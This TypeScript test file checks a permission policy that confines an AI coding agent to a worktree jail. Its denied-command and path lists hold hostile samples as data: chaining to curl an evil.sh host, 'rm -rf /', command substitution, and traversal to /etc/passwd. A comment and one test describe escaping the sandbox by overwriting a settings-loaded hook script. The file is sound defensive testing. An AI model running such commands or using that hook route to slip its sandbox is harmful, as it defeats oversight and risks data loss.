import assert from 'node:assert/strict';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import test, { after, describe } from 'node:test';
import {
  allowedToolsFor,
  classifyCommand,
  classifyPath,
  decide,
  deniedRelPath,
  disallowedToolsFor,
  targetPathsFor,
} from '../src/policy.js';

const tempRoots: string[] = [];

function makeWorktree(): string {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), 'tfa-jail-'));
  tempRoots.push(root);
  fs.mkdirSync(path.join(root, 'src', 'TaskFlow.Api'), { recursive: true });
  fs.writeFileSync(path.join(root, 'src', 'TaskFlow.Api', 'Program.cs'), '// code\n');
  return fs.realpathSync(root);
}

after(() => {
  for (const root of tempRoots) {
    fs.rmSync(root, { recursive: true, force: true });
  }
});

describe('tool sets', () => {
  test('plan mode is read-only', () => {
    assert.deepEqual(allowedToolsFor('plan'), ['Read', 'Glob', 'Grep', 'TodoWrite']);
    for (const tool of ['Edit', 'Write', 'Bash', 'PowerShell']) {
      assert.ok(disallowedToolsFor('plan').includes(tool), `${tool} should be stripped in plan mode`);
    }
  });

  test('execute mode adds edits and Bash but never PowerShell or network tools', () => {
    assert.ok(allowedToolsFor('execute').includes('Edit'));
    assert.ok(allowedToolsFor('execute').includes('Bash'));
    assert.ok(!allowedToolsFor('execute').includes('PowerShell'));
    for (const tool of ['WebFetch', 'WebSearch', 'Task', 'NotebookEdit']) {
      assert.ok(disallowedToolsFor('execute').includes(tool));
    }
  });
});

describe('classifyCommand — allowed', () => {
  for (const command of [
    'dotnet build',
    'dotnet build --configuration Release',
    'dotnet test',
    'dotnet test --filter-not-trait "Category=Postgres"',
    'dotnet test --filter-method "*CreatesProject"',
    'dotnet format',
    'git diff',
    'git diff --stat',
    'git status --short',
    'dotnet build src/TaskFlow.Api/TaskFlow.Api.csproj',
    'dotnet test tests/TaskFlow.Tests',
    'dotnet build My..Odd.Name.csproj',
  ]) {
    test(`allows '${command}'`, () => {
      const decision = classifyCommand(command);
      assert.ok(decision.allow, `${command} should be allowed but was denied: ${decision.reason}`);
    });
  }
});

describe('classifyCommand — denied', () => {
  for (const [command, why] of [
    ['dotnet build && curl http://evil.sh', 'chaining with &&'],
    ['dotnet build; rm -rf /', 'chaining with ;'],
    ['dotnet test || npm publish', 'chaining with ||'],
    ['dotnet test | tee out.txt', 'a pipe'],
    ['dotnet build > out.txt', 'redirection'],
    ['dotnet build `whoami`', 'backtick substitution'],
    ['dotnet build $(whoami)', 'dollar substitution'],
    ['dotnet test %USERPROFILE%', 'cmd expansion'],
    ['dotnet build\nnpm install', 'a newline'],
    ['git push origin main', 'not on the allow-list'],
    ['git commit -m x', 'not on the allow-list'],
    ['npm install', 'not on the allow-list'],
    ['dotnet run', 'not on the allow-list'],
    ['dotnet ef database update', 'not on the allow-list'],
    ['dotnetbuild', 'not on the allow-list'],
    ['echo dotnet build', 'not on the allow-list'],
    ['dotnet test --results-directory ../outside', 'a leading parent-directory escape'],
    ['dotnet build src/../../../evil/x.csproj', 'a mid-path parent escape'],
    ['dotnet test --results-directory out/../../../outside', 'a mid-path parent escape in a flag value'],
    ['dotnet build a/b/../../../../c.csproj', 'repeated mid-path parent segments'],
    ['dotnet build ..', 'a bare parent segment'],
    ['dotnet build src\\..\\..\\evil.csproj', 'a mid-path parent escape with backslashes'],
    ['dotnet build C:..\\evil.csproj', 'a Windows drive-relative parent escape'],
    ['dotnet build ~/evil.csproj', 'a home-directory reference'],
    ['dotnet build "~/evil.csproj"', 'a quoted home-directory reference'],
    ['dotnet test --results-directory /tmp/out', 'an absolute path'],
    ['dotnet build C:\\Windows\\evil.csproj', 'an absolute path'],
    ['dotnet build /p:Foo=bar', 'an absolute-looking MSBuild switch'],
    ['', 'empty'],
    ['   ', 'blank'],
  ] as const) {
    test(`denies '${command}' (${why})`, () => {
      assert.equal(classifyCommand(command).allow, false, `${command} should have been denied`);
    });
  }
});

describe('classifyPath — the jail', () => {
  test('allows a file inside the worktree', () => {
    const jail = makeWorktree();
    assert.ok(classifyPath('src/TaskFlow.Api/Program.cs', jail, jail).allow);
    assert.ok(classifyPath(path.join(jail, 'src', 'New.cs'), jail, jail).allow, 'a file yet to be created');
  });

  test('denies a parent-directory escape', () => {
    const jail = makeWorktree();
    const decision = classifyPath('../outside.txt', jail, jail);
    assert.equal(decision.allow, false);
    assert.match(decision.reason, /outside the worktree/);
  });

  test('denies a deep traversal that lands outside', () => {
    const jail = makeWorktree();
    assert.equal(classifyPath('src/../../../etc/passwd', jail, jail).allow, false);
  });

  test('denies an absolute path outside the worktree', () => {
    const jail = makeWorktree();
    const outside = process.platform === 'win32' ? 'C:\\Windows\\System32\\drivers\\etc\\hosts' : '/etc/hosts';
    assert.equal(classifyPath(outside, jail, jail).allow, false);
  });

  test('denies the sibling worktree of another run', () => {
    const jail = makeWorktree();
    const sibling = `${jail}-other`;
    assert.equal(classifyPath(path.join(sibling, 'file.cs'), jail, jail).allow, false);
  });

  test('sees through a symlinked directory that points outside', (t) => {
    const jail = makeWorktree();
    const outside = makeWorktree();
    const link = path.join(jail, 'escape');
    try {
      // 'junction' works on Windows without elevation; plain 'dir' symlinks do not.
      fs.symlinkSync(outside, link, process.platform === 'win32' ? 'junction' : 'dir');
    } catch (error) {
      t.skip(`cannot create a link on this platform: ${error instanceof Error ? error.message : error}`);
      return;
    }
    const decision = classifyPath('escape/stolen.txt', jail, jail);
    assert.equal(decision.allow, false, 'a symlinked parent must not be a way out');
    assert.match(decision.reason, /outside the worktree/);
  });

  test('denies an empty path', () => {
    const jail = makeWorktree();
    assert.equal(classifyPath('  ', jail, jail).allow, false);
  });
});

describe('deniedRelPath — off limits even inside the jail', () => {
  for (const rel of [
    '.git',
    '.git/config',
    '.git/hooks/pre-commit',
    '.claude',
    '.claude/settings.json',
    '.claude/settings.local.json',
    // The escape that matters: settingSources:['project'] loads the worktree's
    // .claude/settings.json, whose PostToolUse hook executes this script on any
    // edit. If it were writable the command allow-list would be bypassable.
    '.claude/hooks/format-edited-file.ps1',
    '.claude/skills/run-taskflow/smoke.ps1',
    '.claude/agents/dotnet-reviewer.md',
    '.claude/rules/ef-core.md',
    '.env',
    '.env.production',
    'src/TaskFlow.Api/appsettings.Production.json',
    'certs/signing.pfx',
    'deploy/profile.pubxml',
    'deploy/profile.publishsettings',
    'PublishScripts/deploy.ps1',
  ]) {
    test(`denies ${rel}`, () => {
      assert.notEqual(deniedRelPath(rel), null, `${rel} should be off limits`);
    });
  }

  for (const rel of [
    'src/TaskFlow.Api/Program.cs',
    'src/TaskFlow.Api/appsettings.Development.json',
    'CLAUDE.md',
    '.gitignore',
    '.editorconfig',
    'tests/TaskFlow.Tests/ProjectsApiTests.cs',
  ]) {
    test(`allows ${rel}`, () => {
      assert.equal(deniedRelPath(rel), null, `${rel} should be readable`);
    });
  }

  test('the jail applies to reads, not just writes', () => {
    const jail = makeWorktree();
    fs.writeFileSync(path.join(jail, '.env'), 'SECRET=1\n');
    const decision = decide({ mode: 'execute', worktree: jail }, 'Read', { file_path: '.env' });
    assert.equal(decision.allow, false);
    assert.match(decision.reason, /secrets/);
  });
});

describe('targetPathsFor', () => {
  test('reads file_path for file tools and path for search tools', () => {
    assert.deepEqual(targetPathsFor('Read', { file_path: 'a.cs' }), ['a.cs']);
    assert.deepEqual(targetPathsFor('Write', { file_path: 'b.cs', content: 'x' }), ['b.cs']);
    assert.deepEqual(targetPathsFor('Grep', { pattern: 'x', path: 'src' }), ['src']);
    assert.deepEqual(targetPathsFor('Glob', { pattern: '**/*.cs' }), [], 'an omitted path is not a target');
    assert.deepEqual(targetPathsFor('Read', null), []);
  });
});

describe('decide — the gate as a whole', () => {
  test('plan mode refuses to write, edit, or run anything', () => {
    const jail = makeWorktree();
    for (const [tool, input] of [
      ['Write', { file_path: 'src/New.cs', content: 'x' }],
      ['Edit', { file_path: 'src/TaskFlow.Api/Program.cs' }],
      ['Bash', { command: 'dotnet build' }],
      ['PowerShell', { command: 'dotnet build' }],
    ] as const) {
      const decision = decide({ mode: 'plan', worktree: jail }, tool, input);
      assert.equal(decision.allow, false, `${tool} must be denied in plan mode`);
      assert.match(decision.reason, /not available in plan mode/);
    }
  });

  test('plan mode still reads', () => {
    const jail = makeWorktree();
    assert.ok(decide({ mode: 'plan', worktree: jail }, 'Read', { file_path: 'src/TaskFlow.Api/Program.cs' }).allow);
  });

  test('execute mode writes inside the jail but not outside it', () => {
    const jail = makeWorktree();
    assert.ok(decide({ mode: 'execute', worktree: jail }, 'Write', { file_path: 'src/New.cs', content: 'x' }).allow);
    assert.equal(
      decide({ mode: 'execute', worktree: jail }, 'Write', { file_path: '../outside.cs', content: 'x' }).allow,
      false,
    );
  });

  test('an unknown tool is denied by default, not allowed by default', () => {
    const jail = makeWorktree();
    for (const tool of ['WebFetch', 'Task', 'NotebookEdit', 'SomeFutureTool']) {
      assert.equal(decide({ mode: 'execute', worktree: jail }, tool, {}).allow, false, `${tool} must be denied`);
    }
  });

  test('a shell call with no command is denied', () => {
    const jail = makeWorktree();
    assert.equal(decide({ mode: 'execute', worktree: jail }, 'Bash', { description: 'x' }).allow, false);
  });

  test('a Glob/Grep pattern cannot escape the worktree even with no path set', () => {
    const jail = makeWorktree();
    for (const tool of ['Glob', 'Grep'] as const) {
      const decision = decide({ mode: 'plan', worktree: jail }, tool, { pattern: '../../../secret/**' });
      assert.equal(decision.allow, false, `${tool} with a traversing pattern must be denied`);
      assert.match(decision.reason, /parent directory/);
    }
  });

  test('a Glob/Grep pattern with no traversal is still allowed with no path set', () => {
    const jail = makeWorktree();
    assert.ok(decide({ mode: 'plan', worktree: jail }, 'Glob', { pattern: '**/*.cs' }).allow);
  });

  test('an absolute Glob/Grep pattern is denied', () => {
    const jail = makeWorktree();
    const outside = process.platform === 'win32' ? 'C:\\Windows\\**' : '/etc/**';
    assert.equal(decide({ mode: 'plan', worktree: jail }, 'Glob', { pattern: outside }).allow, false);
  });

  test('the host hook script cannot be overwritten in either mode', () => {
    const jail = makeWorktree();
    const hook = { file_path: '.claude/hooks/format-edited-file.ps1', content: 'Invoke-Expression $env:X' };
    for (const mode of ['plan', 'execute'] as const) {
      const decision = decide({ mode, worktree: jail }, 'Write', hook);
      assert.equal(decision.allow, false, `${mode} mode must refuse to write the host hook`);
    }
  });

  test('ExitPlanMode is denied with a reason that says where the plan goes', () => {
    const jail = makeWorktree();
    const decision = decide({ mode: 'plan', worktree: jail }, 'ExitPlanMode', {});
    assert.equal(decision.allow, false);
    assert.match(decision.reason, /final message/);
    assert.match(decision.reason, /plan\.proposed\.md/);
  });

  test('TodoWrite is allowed — it touches neither filesystem nor shell', () => {
    const jail = makeWorktree();
    for (const mode of ['plan', 'execute'] as const) {
      assert.ok(decide({ mode, worktree: jail }, 'TodoWrite', { todos: [] }).allow);
    }
  });
});
